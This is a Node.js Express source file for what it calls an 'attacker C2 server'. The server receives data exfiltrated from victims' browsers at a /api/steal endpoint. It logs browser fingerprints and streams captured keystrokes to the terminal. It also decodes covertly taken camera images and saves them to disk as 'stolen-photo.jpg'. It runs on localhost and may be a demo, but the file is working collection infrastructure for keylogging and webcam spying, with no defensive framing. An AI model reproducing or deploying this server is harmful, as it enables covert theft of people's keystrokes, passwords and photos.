const express = require('express');
const cors = require('cors');

const app = express();
const PORT = 4000;

const fs = require('fs');

// Enable CORS so the React frontend can reach this backend
app.use(cors());
app.use(express.json({ limit: '50mb' }));

// Log nicely to the terminal
console.log("\n=============================================");
console.log("😈  ATTACKER C2 SERVER STARTED               ");
console.log("📡  LISTENING FOR EXFILTRATED STOLEN DATA... ");
console.log(`🌐  PORT: http://localhost:${PORT}           `);
console.log("=============================================\n");

app.post('/api/steal', (req, res) => {
    const data = req.body;

    // Check if it's the initial browser footprint or a keystroke
    if (data.type === 'browserInfo') {
        console.log("\n[!] TARGET ACQUIRED - BROWSER FOOTPRINT:");
        console.log(`     User Agent: ${data.userAgent}`);
        console.log(`     Resolution: ${data.screenResolution}`);
        console.log(`     Timestamp:  ${data.timestamp}`);
    } else if (data.type === 'keystroke') {
        process.stdout.write(`\x1b[31m${data.key}\x1b[0m`); // Prints keys in RED without newlines
    } else if (data.type === 'cameraCapture') {
        console.log("\n\x1b[32m[!!!] MASSIVE SUCCESS - TARGET PHOTOS OBTAINED [!!!]\x1b[0m");
        const base64Data = data.image.replace(/^data:image\/jpeg;base64,/, "");
        fs.writeFileSync("stolen-photo.jpg", base64Data, 'base64');
        console.log("\x1b[32m[+] Photo saved locally as stolen-photo.jpg\x1b[0m\n");
    } else {
        console.log("\n[!] Unknown data received: ", data);
    }
    
    // Respond back to keep the connection alive but silent
    res.status(200).json({ success: true });
});

app.listen(PORT, () => {
    // Already logged at top
});
